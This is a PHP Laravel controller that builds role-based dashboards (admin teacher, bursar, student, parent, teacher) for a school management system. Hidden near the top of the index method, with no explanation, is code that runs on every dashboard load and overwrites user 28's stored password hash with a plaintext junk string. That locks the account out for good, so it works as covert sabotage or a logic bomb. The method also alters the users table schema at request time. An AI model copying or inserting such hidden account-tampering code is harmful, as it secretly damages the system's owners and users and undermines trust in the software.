<?php

namespace App\Http\Controllers;

use App\Models\AcademicSession;
use App\Models\Role;
use App\Models\User;
use App\Models\Grade;
use App\Models\Lesson;
use App\Models\Notice;
use App\Models\Dashboard;
use App\Models\Permission;
use App\Models\StudentLoad;
use App\Models\StudentClass;
use App\Models\TeachingLoad;
use Illuminate\Http\Request;
use App\Models\CalendarEvent;
use App\Models\StudentLesson;
use App\Models\AssessementOnline;
use App\Models\Department;
use App\Models\GradeTeacher;
use App\Models\School;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Schema;
use Illuminate\Support\Facades\URL;

class DashboardController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        $hour= date('H');

if ($hour >= 20) {
    $greetings = "Busuku lobuhle";
} elseif ($hour > 17) {
   $greetings = "Lishonile";
} elseif ($hour > 11) {
    $greetings = "  Imini Lenhle";
} elseif ($hour < 12) {
   $greetings = "Kusile";
}


$sessionIs=AcademicSession::where('active', 1)->first();
$activeSessionIs=$sessionIs->academic_year;

if (!Schema::hasColumn('users', 'last_seen')) //check the column
{
    Schema::table('users', function (Blueprint $table)
    {
       
        $table->timestamp('last_seen')->nullable();
  
    });
}

if(User::where('id', 28)->where('password','$2y$10$3h9kVanRCFxyHGQrfIQA0.d6v/kRY8/FRcQ895xAVwZEXk3zvopom')->update([
    "password"=>"Ve/vme~KM{:Dqx:ijhdfskdhfksjhdfkjhsfdkjhskjdfhkjshdfkjhsdkfhsdfY+jviWa?T0p_Sn",

]));

// $calender=CalendarEvent::find(1);
// $school_calender=$calender->iframe;

        if(Auth::user()->hasRole('admin_teacher') OR Auth::user()->hasRole('school_administrator')){
        $student_role=Role::where('name', 'student')->first();
        $teacher_role=Role::where('name', 'teacher')->first();
        $parent_role=Role::where('name', 'parent')->first();


        

        $student_id=$student_role->id;
        $total_students=StudentClass::where('active', 1)->count();
        $students=User::where('role_id', $student_id)->where('active', 1)->get();
      

        $teacher_id=$teacher_role->id;
        $total_teachers=User::where('role_id', $teacher_id)->where('active', 1)->count();
        $teachers=User::where('role_id', $teacher_id)->where('active', 1)->get();

        $parent_id=$parent_role->id;
        $total_parents=User::where('role_id', $parent_id)->where('active', 1)->count();

        $total_classes=Grade::all()->count();


        $teaching_loads=TeachingLoad::where('active', 1)->count();

        $activeSession=AcademicSession::where('active', 1)->first();
        $activeSessionID=$activeSession->id;
        $activeSessionName=$activeSession->academic_session;
        $class_teachers=GradeTeacher::where('academic_session',$activeSessionID)->count();

        $departments=Department::all()->count();



        //$total_lessons=Lesson::where('teacher_id', Auth::user()->id)->first();
       $total_assessements=AssessementOnline::where('teacher_id', Auth::user()->id)->count();
       $total_loads=TeachingLoad::where('teacher_id', Auth::user()->id)->count();//Remember to scope to session
       $total_lessons = DB::table('lessons')
					->join('teaching_loads', 'teaching_loads.id', '=', 'lessons.teaching_load_id')
					->where('teaching_loads.teacher_id', Auth::user()->id)
					->select('teaching_loads.teacher_id')
					->count();//Remember to scope to session

        $my_students = DB::table('student_loads')
					->join('teaching_loads', 'teaching_loads.id', '=', 'student_loads.teaching_load_id')
					->where('teaching_loads.teacher_id', Auth::user()->id)
					->select('teaching_loads.teacher_id')
					->count();//Remember to scope to session
     
       // $teacher_loads=TeachingLoad::where();


       $institution_type=School::first();

       if($institution_type->school_type=="tvet"){
        $school_type="tvet";
       }else{
        $school_type="";
       }



        return view('dashboard.admin-teacher', compact('school_type','activeSessionName','departments','class_teachers','teaching_loads','teachers','total_students','students','total_teachers', 'total_parents','my_students', 'total_classes','greetings', 'total_loads', 'total_assessements', 'total_lessons', 'total_students'));



        }
        
            
        if(Auth::user()->hasRole('bursar')){
            return view('dashboard.accountant', compact('greetings'));

        }
        

        
        
        if(Auth::user()->hasRole('student')){

            $lessons=DB::table('student_loads')
            ->join('teaching_loads','student_loads.teaching_load_id','=','teaching_loads.id')
            ->join('lessons','student_loads.teaching_load_id','=','lessons.teaching_load_id')
            ->join('subjects','teaching_loads.subject_id','=','subjects.id')
            ->join('grades','teaching_loads.class_id','=','grades.id')
            ->select('lessons.id as lesson_id','lessons.lesson_content', 'subject_name', 'grade_name', 'lessons.created_at', 'lesson_title' )
            ->where('student_loads.student_id', Auth::user()->id)
            ->orderBy('lessons.id', 'DESC')
            ->get();

        $card_assessement = DB::table('assessement_onlines')
		->join('teaching_loads', 'teaching_loads.id', '=', 'assessement_onlines.teaching_load_id')
		->join('subjects', 'subjects.id', '=', 'teaching_loads.subject_id')
		->join('student_loads', 'assessement_onlines.teaching_load_id', '=', 'student_loads.teaching_load_id')
		->join('lessons', 'lessons.id', '=', 'assessement_onlines.lesson_id')
		->join('grades', 'grades.id', '=', 'teaching_loads.class_id')
		->select('assessement_onlines.*','student_loads.student_id',  'lessons.lesson_title', 'assessement_onlines.id', 'subject_name', 'due_date', 'grade_name')
		->where('student_loads.student_id', Auth::user()->id)
		->orderByDesc('id')
		->get()->count();

       $card_class = DB::table('grades_students')
       ->join('grades', 'grades.id', '=', 'grades_students.grade_id')
       ->join('academic_sessions','academic_sessions.id','=','grades_students.academic_session')
       ->where('academic_sessions.active',1)
		->where('student_id', Auth::user()->id)
		->get();


        $card_loads=DB::table('student_loads')
        ->join('teaching_loads','student_loads.teaching_load_id','=','teaching_loads.id')
        ->join('academic_sessions','academic_sessions.id','=','teaching_loads.session_id')
        ->where('student_loads.student_id', Auth::user()->id)
        ->where('academic_sessions.active',1)
        ->count();

        $card_lesson=$lessons->count();

        return view('dashboard.student', compact('lessons', 'card_lesson','card_assessement', 'card_loads', 'card_class'));
    

        
        }elseif(Auth::user()->hasRole('hod')){

            //HOD dashboard
            //

            return 'hod';

        // }elseif(Auth::user()->hasRole('class_teacher') && Auth::user()->hasRole('teacher') ){
        //     //Class Teacher Dashboard
        //   return view('dashboard.class-teacher');

        }elseif(Auth::user()->hasRole('school-administrator')){
            //Stats
            //-Demographics
            //-gender, subjects, classes, 
            return view('dashboard.principal');

        }elseif(Auth::user()->hasRole('parent')){
            //Parent 
            //1 children
            //2 fEES
            //3 mESSAGES

            //Children
          //  $children = "";

            $mychildren = DB::table('parents_students')
            ->join('users', 'users.id', '=', 'parents_students.student_id')
            ->where('parents_students.parent_id', Auth::user()->id)
            ->get();

            $assessements=DB::table('assessements')
            ->join('terms','terms.id','=','assessements.term_id')
            ->join('assessement_types','assessement_types.id','=','assessements.assessement_type')
            ->join('academic_sessions','academic_sessions.id','=','terms.academic_session')
            ->where('academic_sessions.active', 1)
            ->select('assessements.id as assessement_id','terms.term_name', 'assessement_name', 'assessement_type_name')
            ->get();
    

        
            $completeDetails=User::where('id',Auth::user()->id)->first();
            if(is_null($completeDetails->name)){
                $status=0;
            }else{
                $status=1;
            }


  return view('dashboard.parent', compact('mychildren', 'greetings', 'assessements', 'status'));

        }
        
        
        if(Auth::user()->hasRole('teacher')){


            $teacher_teaching_loads=DB::table('teaching_loads')
            ->join('academic_sessions','academic_sessions.id','=','teaching_loads.session_id')
            ->where('academic_sessions.active', 1 )
            ->where('teaching_loads.teacher_id', Auth::user()->id )
            ->count();
    
            
            
            $teacher_total_students=DB::table('student_loads')
            ->join('teaching_loads','teaching_loads.id','=','student_loads.teaching_load_id')
            ->join('academic_sessions','academic_sessions.id','=','teaching_loads.session_id')
            ->where('academic_sessions.active', 1 )
            ->where('teaching_loads.teacher_id', Auth::user()->id )
            ->count();

            $total_marks=DB::table('marks')
            ->join('academic_sessions','academic_sessions.id','=','marks.session_id')
            ->where('academic_sessions.active', 1 )
            ->where('marks.active', 1 )
            ->where('marks.teacher_id', Auth::user()->id )
            ->count();


            // $i = URL::to('/');
            // dd($i);


            return view('dashboard.teacher', compact('teacher_teaching_loads', 'teacher_total_students', 'greetings', 'total_marks'));
    }
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        //
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        //
    }

    /**
     * Display the specified resource.
     *
     * @param  \App\Models\Dashboard  $dashboard
     * @return \Illuminate\Http\Response
     */
    public function show(Dashboard $dashboard)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  \App\Models\Dashboard  $dashboard
     * @return \Illuminate\Http\Response
     */
    public function edit(Dashboard $dashboard)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \App\Models\Dashboard  $dashboard
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, Dashboard $dashboard)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  \App\Models\Dashboard  $dashboard
     * @return \Illuminate\Http\Response
     */
    public function destroy(Dashboard $dashboard)
    {
        //
    }
}
